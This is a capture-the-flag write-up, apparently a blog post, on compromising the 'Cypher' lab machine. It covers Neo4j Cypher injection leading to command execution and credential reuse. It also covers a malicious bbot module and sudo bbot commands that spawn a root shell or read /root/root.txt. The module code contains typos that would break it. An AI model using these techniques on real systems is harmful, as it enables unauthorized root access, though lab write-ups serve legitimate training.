@@ -1,0 +1,151 @@
+---
+layout: post
+title: "Cypher-Linux-Medium"
+date:   2025-07-26 12:05:57 -0400
+categories: writeups
+thumb: /assets/images/logos/765cd4be6f3a366ca83c7ea60bbcaaa8.png
+---
+
+# Cypher
+
+# 1. Enumeration
+<br/><br/>
+Start using nmap to enumerate open tcp ports
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image.png' | relative_url }})
+<br/><br/>
+A nginx web application running on port 80, looks like a simple web application, there are almost any functionality on here
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_1.png' | relative_url }})
+<br/><br/>
+We can sign in but we have no credentials yet
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_2.png' | relative_url }})
+<br/><br/>
+Use wfuzz to discover directories available without authentication, testing is a one that we have not checked
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_3.png' | relative_url }})
+<br/><br/>
+A jar artifact that seems to be own of this web application
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_4.png' | relative_url }})
+<br/><br/>
+# 2. User flag
+<br/><br/>
+Let’s analyze this .jar file using jd-gui (java-decompiler) this is a custom application `getUrlStatusCode` that receives a url to obtain its url status code, now we need a way to call this function and inject this command 
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_5.png' | relative_url }})
+<br/><br/>
+We haven’t got many options, check if the username in the sign in form is sanitized
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_6.png' | relative_url }})
+<br/><br/>
+Effectively it is vulnerable, but this is not sql injection, as we can see, some information is disclosed in the error message, it is running neo4j database, and the query is also shown
+<br/><br/>
+
+```c
+MATCH (u:USER)-[SECRET]->(h.SHA1) WHERE u.name = 'username' return h.value as hash
+```
+
+<br/><br/>
+The procedure to build a valid cypher injection is:
+<br/><br/>
+- We need to close the query as it normally would
+- Perform a function call to trigger the command executed in `getUrlStatusCode`
+- We need to be sure, the neo4j engine perform the query correctly without errors, use YIELD to return the status code dicted in the function to the query, then return this value to the query return
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_7.png' | relative_url }})
+<br/><br/>
+As we can see it is being executed, the only problem is the name of the function, check the class where the function is defined to call it properly
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_8.png' | relative_url }})
+<br/><br/>
+Now it’s time to inject the reverse shell in the url parameter expected by the function 
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_9.png' | relative_url }})
+<br/><br/>
+It has run correctly, a shell with neo4j user is returned 
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_10.png' | relative_url }})
+<br/><br/>
+Moving around, enumerating other users and their directories we found read permissions over a files in graphasm directory with neo4j credentials
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_11.png' | relative_url }})
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_12.png' | relative_url }})
+<br/><br/>
+Those creds are being reused to get the user flag
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_13.png' | relative_url }})
+<br/><br/>
+# 3.Priv esc
+<br/><br/>
+This user has the ability to run bbot binary as root
+<br/><br/>
+
+<aside>
+💡
+
+bbot is a scanning tool, used for enumerating and reconnaissance, focusing on OSINT for penetration testing purposes
+
+</aside>
+
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_14.png' | relative_url }})
+<br/><br/>
+Searching on internet there are malicious modules we can use it to spawn a shell as root
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_15.png' | relative_url }})
+<br/><br/>
+
+```python
+##preset.yml
+description: HAHA PWNED
+module_dirs:
+	-.
+modules:
+	-systeminfo_enum
+```
+
+```python
+#systeminfo_enum.py
+from bbot.modules.base import BaseModule
+import pty
+import os
+
+class systeninfo_enum(BaseModule):
+	watched_events = []
+	produced_events = []
+	meta = {"description":"You will be pwned"}
+	
+	#setup called when the module is initialized
+	async def setup(self):
+		sef.hugesuccess("Set-up called - pwned!!@@!")
+		try:
+			pty.spawn(["/bin/bash", "-p"])
+			except Exception as e:
+			self.error(f"Somethin wrong {e}")
+		return True
+		
+```
+
+<br/><br/>
+All bbot even modules running as root
+<br/><br/>
+![image.png]({{ '/assets/images/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947_image_16.png' | relative_url }})
+<br/><br/>
+If we only want the flag we can avoid this module method and use the next flags
+<br/><br/>
+
+```c
+sudo /usr/local/bin/bbot -t /root/root.txt -d
+sudo /usr/local/bin/bbot --custom-yara-rules /root/root.txt -debug
+```
+
+<br/><br/>
+Machine pwned!@!@!!
+
+<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
